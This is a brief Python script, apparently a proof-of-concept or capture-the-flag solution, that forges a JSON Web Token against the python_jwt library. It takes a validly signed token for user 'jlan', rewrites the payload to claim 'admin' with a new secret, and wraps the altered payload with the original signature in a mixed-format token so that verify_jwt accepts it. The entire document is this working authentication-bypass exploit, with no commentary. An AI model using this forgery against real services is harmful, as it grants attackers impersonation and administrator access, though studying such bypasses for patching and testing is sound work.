from json import *  
from python_jwt import *  
from jwcrypto import jwk  
payload={'username':"jlan","secret":"10010"}  
key=jwk.JWK.generate(kty='RSA', size=2048)  
jwtjson=generate_jwt(payload, key, 'PS256', timedelta(minutes=60))  
[header, payload, signature] = jwtjson.split('.')  
parsed_payload = loads(base64url_decode(payload))  
print(parsed_payload)  
parsed_payload['username']="admin"  
parsed_payload['secret']="10086"  
fakepayload=base64url_encode((dumps(parsed_payload, separators=(',', ':'))))  
fakejwt='{"' + header + '.' + fakepayload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'  
print(verify_jwt(fakejwt, key, ['PS256']))  
